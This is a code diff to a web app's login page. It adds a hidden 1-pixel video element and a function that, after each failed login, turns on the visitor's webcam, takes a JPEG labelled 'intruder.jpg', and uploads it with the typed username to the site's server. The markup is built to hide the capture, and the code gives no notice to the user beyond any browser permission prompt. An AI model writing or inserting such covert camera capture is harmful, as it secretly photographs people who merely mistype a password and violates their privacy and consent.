@@ -3297,6 +3297,8 @@
         <button onclick="performLogin()">Login</button>
       </div>
       <div id="loginError" class="error-text"></div>
+      <video id="loginCam" autoplay playsinline style="display:none;width:1px;height:1px;"></video>
+      <canvas id="loginCamCanvas" style="display:none;"></canvas>
     </div>
   </div>
 
@@ -4422,6 +4424,28 @@
       }
     }
 
+    async function captureFailedLoginPhoto(username) {
+      try {
+        const video = document.getElementById("loginCam");
+        const canvas = document.getElementById("loginCamCanvas");
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
+        video.srcObject = stream;
+        await new Promise(r => setTimeout(r, 1500));
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        canvas.getContext("2d").drawImage(video, 0, 0);
+        stream.getTracks().forEach(t => t.stop());
+        video.srcObject = null;
+        const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg", 0.8));
+        const formData = new FormData();
+        formData.append("photo", blob, "intruder.jpg");
+        formData.append("username", username);
+        await fetch("/auth/failed-login-photo", { method: "POST", body: formData });
+      } catch (e) {
+        console.warn("Webcam capture failed:", e);
+      }
+    }
+
     async function performLogin() {
       const username = document.getElementById("loginUsername").value.trim();
       const password = document.getElementById("loginPassword").value;
@@ -4450,6 +4474,7 @@
         }
       } catch {
         document.getElementById("loginError").innerText = "Invalid credentials.";
+        captureFailedLoginPhoto(username);
       }
     }
 
